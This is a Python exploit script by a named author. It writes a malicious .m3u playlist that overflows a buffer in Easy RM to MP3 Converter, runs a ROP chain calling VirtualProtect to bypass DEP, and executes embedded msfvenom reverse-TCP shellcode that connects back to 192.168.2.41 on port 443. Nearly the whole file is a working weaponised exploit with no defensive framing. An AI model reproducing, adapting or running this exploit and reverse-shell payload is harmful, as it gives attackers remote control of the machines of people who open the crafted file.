#!/usr/bin/python
# Written By: Eric Van Zutphen
# Purpose: Easy RM to MP3 Conversion ROP DEP Bypass Exploit Using VirtualProtect() Win API Call

import sys, struct

exploit_file = open('exploit_rop.m3u','w')
nops = "\x90" * 200
buffer = 'A' * 26071

#----------------------------Return to Stack---------------------------------------------#
eip = struct.pack('<L',0x100102DC) # Return to Stack
compensate = 'A' * 4 # Compensate
#----------------------------Put Stack Pointer in EDI & EAX -----------------------------#
rop = struct.pack('<L', 0x5AD79277) #PUSH ESP # POP EDI # RETN
rop += struct.pack('<L',0x77C1E842) #PUSH EDI # POP EAX # RETN
rop += struct.pack('<L',0x41414141) # Compensate
#Stack pointer is now in EAX & EDI now Jump Over Parameters
rop += struct.pack('<L',0x1001653D) # ADD 20, ESP # RETN
#-------------------------VirutalProtecgt() WinAPI Call----------------------------------#
params = struct.pack('<L',0x7C801AD4) # Return Address 0x000FF80C
params += struct.pack('<L',0x01010101) # Return Address 0x000FF80C
params += struct.pack('<L',0x47474747) # lpAdress
params += struct.pack('<L',0x48484848) # Size - Shellcode Length
params += struct.pack('<L',0x49494949) # flNewProtect
params += struct.pack('<L',0x10035005) # Writable Address
params += struct.pack('<L',0x41414141) # Padding
params += struct.pack('<L',0x41414141) # Padding
# ADD ESP, 20 Will Land Here!
#--------------------------Change ESI to Point to Current Location ----------------------#
rop2 = struct.pack('<L',0x763C982F)  # XCHG ESI,EDI # DEC ECX # RETN 4 
rop2 += struct.pack('<L',0x1002DC4C) # ADD EAX 100 Make EAX point to shellcode
rop2 += struct.pack('<L',0x41414141) # Padding
rop2 += struct.pack('<L',0x41414141) # Padding
#---------------------------Return Address in EAX ---------------------------------------#
rop2 += struct.pack('<L',0x77E84115) # MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN
rop2 += struct.pack('<L',0x41414141) # Padding
#----------------------------SAVE Stack Pointer back to EAX------------------------------#
rop2 += struct.pack('<L',0x775D131E)# #PUSH EAX # POP ESI # RETN 
#---------------------------Set lpAdress-------------------------------------------------#
rop2 += struct.pack('<L',0x1002DC4C) # ADD EAX 100 # Make EAX point to shellcode
rop2 += struct.pack('<L',0x41414141) # Padding
rop2 += struct.pack('<L',0x77157D1D) # INC ESI # RETN
rop2 += struct.pack('<L',0x77157D1D) # INC ESI # RETN
rop2 += struct.pack('<L',0x77157D1D) # INC ESI # RETN
rop2 += struct.pack('<L',0x77157D1D) # INC ESI # RETN
# Write lpAdress to VirtualProtect Param
rop2 += struct.pack('<L',0x77E84115) # MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN
rop2 += struct.pack('<L',0x41414141) # Padding
#----------------------------SAVE Stack Pointer back to EAX------------------------------#
rop2 += struct.pack('<L',0x775D131E)# #PUSH EAX # POP ESI # RETN 
#-------------------------------Shellcode Length-----------------------------------------#
# Zero Out EAX
rop2 += struct.pack('<L',0x100307A9)# # XOR EAX, EAX # RETN
rop2 += struct.pack('<L',0x1002DC4C) # ADD EAX, 100 # Add 256 Bytes for Shellcode
rop2 += struct.pack('<L',0x41414141) # Padding
rop2 += struct.pack('<L',0x1002DC4C) # ADD EAX, 100 # Add 256 Bytes for Shellcode
rop2 += struct.pack('<L',0x41414141) # Padding
rop2 += struct.pack('<L',0x1002DC4C) # ADD EAX, 100 # Add 256 Bytes for Shellcode
rop2 += struct.pack('<L',0x41414141) # Padding
rop2 += struct.pack('<L',0x77157D1D) # INC ESI # RETN
rop2 += struct.pack('<L',0x77157D1D) # INC ESI # RETN
rop2 += struct.pack('<L',0x77157D1D) # INC ESI # RETN
rop2 += struct.pack('<L',0x77157D1D) # INC ESI # RETN
# Write Shellcode Length to  VirtualProtect Win API Call
rop2 += struct.pack('<L',0x77E84115) # MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN
rop2 += struct.pack('<L',0x41414141) # Padding
#----------------------------SAVE Stack Pointer back to EAX------------------------------#
rop2 += struct.pack('<L',0x775D131E)# #PUSH EAX # POP ESI # RETN 
#----------------------------flNewProtect------------------------------------------------#
# Zero Out EAX
rop2 += struct.pack('<L',0x100307A9) # XOR EAX, EAX # RETN
rop2 += struct.pack('<L',0x1002dc41) # ADD 40, EAX # RETN
rop2 += struct.pack('<L',0x41414141) # Padding
rop2 += struct.pack('<L',0x77157D1D) # INC ESI # RETN
rop2 += struct.pack('<L',0x77157D1D) # INC ESI # RETN
rop2 += struct.pack('<L',0x77157D1D) # INC ESI # RETN
rop2 += struct.pack('<L',0x77157D1D) # INC ESI # RETN
# Write 40 to flNewProtect Parameter of Virutal Protect Win API Call
rop2 += struct.pack('<L',0x77E84115) # MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN
rop2 += struct.pack('<L',0x41414141) # Padding
#----------------------------Jump to VierualProtect---------------------------------------#
rop2 += struct.pack('<L',0x775D12F1) # SUB EAX, 4 # RETN # Compensate for POP instruction
rop2 += struct.pack('<L',0x775D12F1) # SUB EAX, 4 #  RETN # Compensate for POP insruction
# Move EAX into ESP and Jump BACK to Virtual Protect
rop2 += struct.pack('<L',0x73DF5CA8) # PUSH EAX # POP ESP # MOV EAX,EDI # POP EDI # POP ESI # RETN

end = 'C' * 300

"""
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp EXITFUNC=seh -b '\x00' -f python LHOST=192.168.2.41 LPORT=443 -v shellcode
Payload size: 351 bytes
"""
shellcode =  ""
shellcode += "\xbd\xde\xbf\xad\x86\xda\xc5\xd9\x74\x24\xf4\x5b"
shellcode += "\x31\xc9\xb1\x52\x83\xeb\xfc\x31\x6b\x0e\x03\xb5"
shellcode += "\xb1\x4f\x73\xb5\x26\x0d\x7c\x45\xb7\x72\xf4\xa0"
shellcode += "\x86\xb2\x62\xa1\xb9\x02\xe0\xe7\x35\xe8\xa4\x13"
shellcode += "\xcd\x9c\x60\x14\x66\x2a\x57\x1b\x77\x07\xab\x3a"
shellcode += "\xfb\x5a\xf8\x9c\xc2\x94\x0d\xdd\x03\xc8\xfc\x8f"
shellcode += "\xdc\x86\x53\x3f\x68\xd2\x6f\xb4\x22\xf2\xf7\x29"
shellcode += "\xf2\xf5\xd6\xfc\x88\xaf\xf8\xff\x5d\xc4\xb0\xe7"
shellcode += "\x82\xe1\x0b\x9c\x71\x9d\x8d\x74\x48\x5e\x21\xb9"
shellcode += "\x64\xad\x3b\xfe\x43\x4e\x4e\xf6\xb7\xf3\x49\xcd"
shellcode += "\xca\x2f\xdf\xd5\x6d\xbb\x47\x31\x8f\x68\x11\xb2"
shellcode += "\x83\xc5\x55\x9c\x87\xd8\xba\x97\xbc\x51\x3d\x77"
shellcode += "\x35\x21\x1a\x53\x1d\xf1\x03\xc2\xfb\x54\x3b\x14"
shellcode += "\xa4\x09\x99\x5f\x49\x5d\x90\x02\x06\x92\x99\xbc"
shellcode += "\xd6\xbc\xaa\xcf\xe4\x63\x01\x47\x45\xeb\x8f\x90"
shellcode += "\xaa\xc6\x68\x0e\x55\xe9\x88\x07\x92\xbd\xd8\x3f"
shellcode += "\x33\xbe\xb2\xbf\xbc\x6b\x14\xef\x12\xc4\xd5\x5f"
shellcode += "\xd3\xb4\xbd\xb5\xdc\xeb\xde\xb6\x36\x84\x75\x4d"
shellcode += "\xd1\x6b\x21\x4f\x08\x04\x30\x4f\x4b\x6f\xbd\xa9"
shellcode += "\x21\x9f\xe8\x62\xde\x06\xb1\xf8\x7f\xc6\x6f\x85"
shellcode += "\x40\x4c\x9c\x7a\x0e\xa5\xe9\x68\xe7\x45\xa4\xd2"
shellcode += "\xae\x5a\x12\x7a\x2c\xc8\xf9\x7a\x3b\xf1\x55\x2d"
shellcode += "\x6c\xc7\xaf\xbb\x80\x7e\x06\xd9\x58\xe6\x61\x59"
shellcode += "\x87\xdb\x6c\x60\x4a\x67\x4b\x72\x92\x68\xd7\x26"
shellcode += "\x4a\x3f\x81\x90\x2c\xe9\x63\x4a\xe7\x46\x2a\x1a"
shellcode += "\x7e\xa5\xed\x5c\x7f\xe0\x9b\x80\xce\x5d\xda\xbf"
shellcode += "\xff\x09\xea\xb8\x1d\xaa\x15\x13\xa6\xd4\xe4\xa9"
shellcode += "\x33\x40\x5f\x58\x7e\x0c\x60\xb7\xbd\x29\xe3\x3d"
shellcode += "\x3e\xce\xfb\x34\x3b\x8a\xbb\xa5\x31\x83\x29\xc9"
shellcode += "\xe6\xa4\x7b"

payload = buffer + eip + compensate + rop + params + rop2 + nops + shellcode + end

exploit_file.write(payload)
exploit_file.close()

print "\n[+]Payload Length: " + str(len(payload))
print "[+]M3U File exploit_rop.m3u Created!"
print "[+]ShellcoderZ.com[+]"
